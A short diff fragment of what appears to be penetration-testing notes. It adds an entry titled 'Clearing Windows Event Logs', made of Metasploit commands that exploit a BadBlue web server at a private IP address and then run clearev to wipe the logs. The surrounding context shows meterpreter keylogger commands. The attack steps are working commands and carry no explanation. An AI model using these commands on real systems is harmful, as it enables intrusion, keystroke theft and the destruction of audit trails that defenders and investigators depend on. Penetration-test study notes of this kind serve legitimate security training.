@@ -1426,8 +1426,15 @@ keyscan_start
 keyscan_dump
 ```
 
+74)   Clearing Windows Event Logs
 
-
+```
+msfconsole
+use exploit/windows/http/badblue_passthru
+set RHOSTS 10.2.27.188
+exploit
+clearev
+```
 
 
 
